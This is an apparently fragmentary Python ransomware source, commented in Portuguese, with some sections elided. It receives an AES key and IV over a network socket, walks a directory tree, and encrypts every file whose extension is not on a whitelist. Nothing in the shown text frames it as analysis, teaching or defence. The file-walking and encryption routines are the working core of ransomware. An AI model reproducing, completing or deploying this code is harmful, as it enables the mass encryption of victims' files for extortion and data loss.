    ...
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        ...
        with conn:
            while True:
                ...
                if not data:
                    break
                data2 = data.decode('utf-8')  # Decodifica os dados
                parte = data2.split(',')  # Divide a string usando vírgula

                if len(parte) >= 2:
                    # Armazena as duas partes em variáveis
                    var1 = parte[0].strip()  # Primeiro dado
                    var2 = parte[1].strip()  # Segundo dado
                    
                    # Converte as partes para bytes
                    chave_aes = bytes.fromhex(var1)  # Converte para bytes
                    chave_iv = bytes.fromhex(var2)    # Converte para bytes
                    busca_arqv(caminho)
                break  
...
def encrypt_arqv(arqv_path):
    ...
    try:
        # Ler o arquivo que será criptografado
        with open(arqv_path, 'rb') as f:
            texto = f.read()

        # Criar o cipher usando CBC
...
def busca_arqv(caminho):
    ...
    for diretorio, _, arqvs in os.walk(caminho):
        for _arqv in arqvs:
            ...
            ext = arqv_path.split('.')[-1] # o uso do -1 para pegar a última extensão
            if ext not in white_list:
                encrypt_arqv(arqv_path)  # Criptografar o arquivo
